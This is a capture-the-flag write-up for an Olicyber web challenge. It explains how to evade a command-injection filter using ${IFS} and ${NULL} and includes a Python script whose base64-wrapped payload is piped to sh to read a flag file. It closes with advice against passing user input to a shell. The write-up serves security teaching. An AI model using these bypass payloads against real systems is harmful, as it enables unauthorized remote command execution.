---
title: "TIMP — OS Command Injection with IFS and Null Byte Filter Bypass"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "rce", "command-injection", "filter-bypass", "python"]
difficulty: "advanced"
summary: "A POST endpoint executes a shell command with user-supplied input but filters spaces, the word 'echo', and other shell metacharacters. Bypass with ${NULL} (strips to nothing) and ${IFS} (the internal field separator, expands to a space in bash)."
---

## The Challenge

An application exposes a command-execution endpoint. Spaces and the word `echo` are blocked by the WAF. The goal is to run `cat /flag.txt` — but the command requires both a space and the ability to echo data. The WAF also appears to block direct paths.

## Approach

Two shell variable tricks substitute the blocked characters:

- **`${IFS}`** — the Internal Field Separator expands to a space (or tab/newline) in bash. Completely bypasses any literal space filter.
- **`${NULL}`** — an unset variable expands to the empty string. Inserting it inside a blocked word like `echo` breaks the string match (`ech${NULL}o`) without affecting execution.

The full injection: encode the real command in base64, then pipe it through:
```
ech${NULL}o${IFS}<base64_payload>|base64${IFS}-d|sh
```

This echoes the base64 string (spaces replaced by `${IFS}`, echo split by `${NULL}`), pipes it to `base64 -d` to decode, and pipes the result to `sh` for execution.

## Solution

```python
import requests, base64

site = "http://timp.challs.olicyber.it/cmd"
real_cmd = "cat /flag.txt"
encoded = base64.b64encode(real_cmd.encode()).decode()

# echo ${IFS} bypasses space filter; ech${NULL}o bypasses "echo" keyword filter
payload = f"ech${{NULL}}o${{IFS}}{encoded}|base64${{IFS}}-d|sh"
r = requests.post(site, data={"cmd": payload})
print(r.text)
```

`base64.b64encode("cat /flag.txt".encode()).decode()` produces `Y2F0IC9mbGFnLnR4dA==`. The filter sees no literal `echo` and no literal spaces — just `${NULL}`, `${IFS}`, and base64 characters. Bash reassembles the command and executes it.

## What I Learned

Shell injection bypasses using `${IFS}` and `${NULL}` are well-documented techniques. The correct fix is to never pass user input to a shell at all — use subprocess with a list argument in Python, or a language-native implementation of whatever operation is needed. Blacklisting shell syntax is an arms race you will always lose.
